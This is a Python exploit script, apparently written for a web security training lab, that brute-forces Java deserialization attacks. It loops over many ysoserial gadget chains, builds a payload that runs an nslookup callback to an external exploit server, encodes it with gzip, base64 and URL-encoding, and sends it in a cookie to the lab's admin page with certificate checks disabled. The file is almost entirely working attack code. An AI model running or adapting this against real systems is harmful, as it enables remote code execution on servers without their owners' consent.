import base64
import gzip
import subprocess
import requests
from urllib.parse import quote
import urllib3

urllib3.disable_warnings()

# === Config ===
command = "nslookup https://exploit-0a43002a0460ac5b8396ff5901bf0015.exploit-server.net/SERIAL"
target_url = "https://0a5000da04b3ac88842000b00050007f.web-security-academy.net/admin"
ysoserial_path = "./ysoserial.jar"
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

cookies_static = {
    "_lab": "46|MCwCFE1UxPI3DFXpvJsrwf2BqMjXTDnjAhRZLSUeogmuPWrX3THXIVxSyQUkg9BKIgQ19aXJfLYqasoMRwpBMIrlmdSPaeHuB5LagYy1OYprj3VBYZWSYZn+9Rxea6X6Pa5A9CAEE3lyugPSWRk+rWfFpgdQJgqRhGnxM5hdqoIWQ2g=",
    "session": "thy0qMGpyFIWupHxOUzfr3aIkp5aqIKT"
}

gadget_list = [
    "CommonsCollections1","URLDNS", "CommonsCollections3 ","Groovy1","CommonsCollections2", "CommonsBeanutils1",
    "Spring1", "Clojure", "JRMPClient", "JavassistWeld1", "CommonsCollections7",
    "Hibernate1", "MozillaRhino1", "Vaadin1", "BeanShell1"
]

for gadget in gadget_list:
    print(f"\n[+] Generating payload: {gadget} -> {command}")
    try:
        p = subprocess.Popen(
            [
                "java",
                "-jar", ysoserial_path,
                gadget, command
            ],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        ser, err = p.communicate(timeout=15)

        if p.returncode != 0 or not ser:
            print(f"    [-] Failed to generate payload: {err.decode().strip().splitlines()[0]}")
            continue

        # Step 2: gzip + base64 + urlencode
        gzipped = gzip.compress(ser)
        b64 = base64.b64encode(gzipped).decode()
        cookie_payload = quote(b64)
        print(f"    [+] Payload generated: {cookie_payload} ... ({len(cookie_payload)} bytes)")
        # Step 3: Send request
        cookies = cookies_static.copy()
        cookies["admin-prefs"] = cookie_payload

        print(f"    [+] Sending request with gadget {gadget}...")
        r = requests.get(target_url, cookies=cookies, proxies=proxies, verify=False)
        print(f"    [+] Response: {r.status_code} ({len(r.text)} bytes)")

    except Exception as e:
        print(f"    [!] Exception for {gadget}: {e}")
